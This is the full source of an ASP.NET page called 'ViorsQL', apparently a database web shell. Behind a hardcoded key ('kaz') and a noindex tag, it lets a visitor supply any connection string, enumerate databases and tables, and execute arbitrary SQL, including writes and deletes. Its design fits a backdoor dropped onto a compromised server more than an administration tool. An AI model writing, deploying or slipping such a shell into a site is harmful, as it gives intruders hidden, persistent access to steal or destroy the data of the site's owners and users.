<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<!DOCTYPE html>
<html>
<head runat="server">
    <title>ViorsQL</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body {
            background-color: #1e1e1e;
            color: #ddd;
            font-family: Consolas, monospace;
            margin: 0;
            padding: 20px;
        }
        input, select, textarea, button {
            font-family: Consolas, monospace;
            font-size: 100%;
            background-color: #2d2d2d;
            color: #ddd;
            border: 1px solid #444;
            padding: 4px;
        }
        button {
            cursor: pointer;
        }
        label {
            display: inline-block;
            margin-top: 10px;
            color: #ccc;
        }
        .result-container {
            overflow-x: auto;
            max-width: 100%;
            border: 1px solid #444;
            background-color: #111;
            padding: 6px;
            margin-top: 10px;
        }
        textarea {
            width: 100%;
            height: 200px;
        }
        table.result {
            border-collapse: collapse;
            width: 100%;
            table-layout: fixed;
            word-wrap: break-word;
            white-space: normal;
            font-size: 95%;
            color: #ccc;
        }
        table.result th, table.result td {
            border: 1px solid #444;
            padding: 6px;
        }
        table.result th {
            background: #333;
            font-weight: bold;
        }
        #copyNotice {
            display: none;
            margin-left: 10px;
            color: lime;
            font-size: 90%;
        }
    </style>
</head>
<div style="background:#000; padding:6px 10px; color:#0ff; font-weight:bold; font-family:Consolas,monospace; text-align:center;">- [ ViorsQL ] -</div>
<form id="form1" runat="server">
        <div>
            <label>V-Auth:</label>
            <asp:TextBox ID="txtAuth" runat="server" Width="200px" />
            <br /><br />
            <label>Conn String:</label>
            <asp:TextBox ID="txtConn" runat="server" Width="60%" />
            <asp:Button ID="btnGetDb" runat="server" Text="Fetch DB" OnClick="btnGetDb_Click" />
            <br /><br />

            <label>DB Scope:</label>
            <asp:DropDownList ID="ddlDatabase" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlDatabase_SelectedIndexChanged" />
            <asp:Button ID="btnGetTables" runat="server" Text="Load Tables" OnClick="btnGetTables_Click" />

            <label>Tables:</label>
            <asp:DropDownList ID="ddlTables" runat="server" ClientIDMode="Static" />
            <button type="button" onclick="copySelectedTable()">copy</button>
            <span id="copyNotice">copied.</span>

            <br /><br />
            <label>SQL Console</label><br />
            <asp:TextBox ID="txtQuery" runat="server" TextMode="MultiLine" Width="100%" Height="200px" />
            <br />
            <asp:Button ID="btnExec" runat="server" Text=">>" OnClick="btnExec_Click" />
            <br /><br />
            <div class="result-container">
                <asp:Literal ID="litResult" runat="server" />
            </div>
        </div>
    </form>
    <script type="text/javascript">
        function copySelectedTable() {
            var ddl = document.getElementById("ddlTables");
            var selectedText = ddl.options[ddl.selectedIndex].text;
            navigator.clipboard.writeText(selectedText).then(function () {
                var notice = document.getElementById("copyNotice");
                notice.style.display = "inline";
                setTimeout(function () { notice.style.display = "none"; }, 1500);
            });
        }
    </script>
</body>
<script runat="server">
    private const string AUTHKEY = "kaz";
    private string GetBaseConnString() { return txtConn.Text; }

    protected void btnGetDb_Click(object sender, EventArgs e)
    {
        if (txtAuth.Text != AUTHKEY)
        {
            litResult.Text = "<pre style='color:red'>Invalid Auth Key</pre>";
            return;
        }
        try
        {
            using (SqlConnection conn = new SqlConnection(GetBaseConnString()))
            {
                conn.Open();
                SqlCommand cmd = new SqlCommand("SELECT name FROM sys.databases", conn);
                ddlDatabase.Items.Clear();
                SqlDataReader r = cmd.ExecuteReader();
                while (r.Read())
                {
                    ddlDatabase.Items.Add(r.GetString(0));
                }
            }
        }
        catch (Exception ex)
        {
            litResult.Text = "<pre style='color:red'>" + ex.Message + "</pre>";
        }
    }

    protected void ddlDatabase_SelectedIndexChanged(object sender, EventArgs e)
    {
        UpdateConnectionToSelectedDb();
        btnGetTables_Click(sender, e);
    }

    private void UpdateConnectionToSelectedDb()
    {
        if (!string.IsNullOrEmpty(txtConn.Text) && ddlDatabase.SelectedValue != "")
        {
            SqlConnectionStringBuilder builder = new SqlConnectionStringBuilder(txtConn.Text);
            builder.InitialCatalog = ddlDatabase.SelectedValue;
            txtConn.Text = builder.ConnectionString;
        }
    }

    protected void btnGetTables_Click(object sender, EventArgs e)
    {
        if (txtAuth.Text != AUTHKEY)
        {
            litResult.Text = "<pre style='color:red'>Invalid Auth Key</pre>";
            return;
        }
        try
        {
            using (SqlConnection conn = new SqlConnection(GetBaseConnString()))
            {
                conn.Open();
                SqlCommand cmd = new SqlCommand("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' ORDER BY TABLE_NAME", conn);
                ddlTables.Items.Clear();
                SqlDataReader r = cmd.ExecuteReader();
                while (r.Read())
                {
                    ddlTables.Items.Add(r.GetString(0));
                }
            }
        }
        catch (Exception ex)
        {
            litResult.Text = "<pre style='color:red'>" + ex.Message + "</pre>";
        }
    }

    protected void btnExec_Click(object sender, EventArgs e)
    {
        if (txtAuth.Text != AUTHKEY)
        {
            litResult.Text = "<pre style='color:red'>Invalid Auth Key</pre>";
            return;
        }
        if (txtQuery.Text == null || txtQuery.Text.Trim() == "")
        {
            litResult.Text = "<pre style='color:red'>Query cannot be empty.</pre>";
            return;
        }
        try
        {
            using (SqlConnection conn = new SqlConnection(GetBaseConnString()))
            {
                conn.Open();
                SqlCommand cmd = new SqlCommand(txtQuery.Text, conn);
                cmd.CommandTimeout = 10;

                if (txtQuery.Text.TrimStart().StartsWith("SELECT", StringComparison.OrdinalIgnoreCase))
                {
                    SqlDataReader r = cmd.ExecuteReader();
                    System.Text.StringBuilder sb = new System.Text.StringBuilder();
                    sb.Append("<table class='result'>");
                    sb.Append("<tr>");
                    for (int i = 0; i < r.FieldCount; i++)
                    {
                        sb.Append("<th>" + r.GetName(i) + "</th>");
                    }
                    sb.Append("</tr>");

                    while (r.Read())
                    {
                        sb.Append("<tr>");
                        for (int i = 0; i < r.FieldCount; i++)
                        {
                            sb.Append("<td><pre style='margin:0; white-space:pre-wrap;'>" + System.Web.HttpUtility.HtmlEncode(r[i].ToString()) + "</pre></td>");
                        }
                        sb.Append("</tr>");
                    }
                    sb.Append("</table>");
                    litResult.Text = sb.ToString();
                }
                else
                {
                    int affected = cmd.ExecuteNonQuery();
                    litResult.Text = string.Format("<pre style='color:green'>Non-query executed. Rows affected: {0}</pre>", affected);
                }
            }
        }
        catch (Exception ex)
        {
            litResult.Text = "<pre style='color:red'>" + ex.Message + "</pre>";
        }
    }
</script>
</html>
